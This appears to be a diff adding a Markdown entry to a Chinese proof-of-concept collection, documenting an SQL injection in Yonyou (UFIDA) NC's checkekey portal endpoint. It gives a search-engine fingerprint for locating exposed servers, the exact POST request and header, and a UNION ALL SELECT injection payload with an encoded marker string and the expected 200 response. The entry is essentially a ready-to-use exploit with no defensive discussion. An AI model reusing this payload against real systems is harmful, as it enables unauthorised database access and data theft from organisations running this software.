@@ -1,0 +1,12 @@
+# 用友NCcheckekey存在SQL注入漏洞
+
+- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
+- **指纹**：`app="用友-UFIDA-NC"`
+- **请求**：`POST /portal/pt/office/checkekey?pageId=login HTTP/1.1`
+- **关键头**：`Content-Type: application/x-www-form-urlencoded`
+
+**请求体 / payload**
+```
+user=1' UNION ALL SELECT NULL,CHR(113)CHR(113)CHR(112)CHR(122)CHR(113)CHR(80)CHR(103)CHR(106)CHR(122)CHR(81)CHR(70)CHR(74)CHR(104)CHR(106)CHR(107)CHR(100)CHR(74)CHR(105)CHR(114)CHR(88)CHR(73)CHR(112)CHR(81)CHR(101)CHR(119)CHR(116)CHR(79)CHR(71)CHR(78)CHR(115)CHR(65)CHR(111)CHR(70)CHR(103)CHR(85)CHR(71)CHR(83)CHR(101)CHR(65)CHR(71)CHR(90)CHR(114)CHR(87)CHR(78)CHR(107)CHR(113)CHR(106)CHR(98)CHR(112)CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL-- twnX&ekey=1
+```
+- **预期**：200　|　—
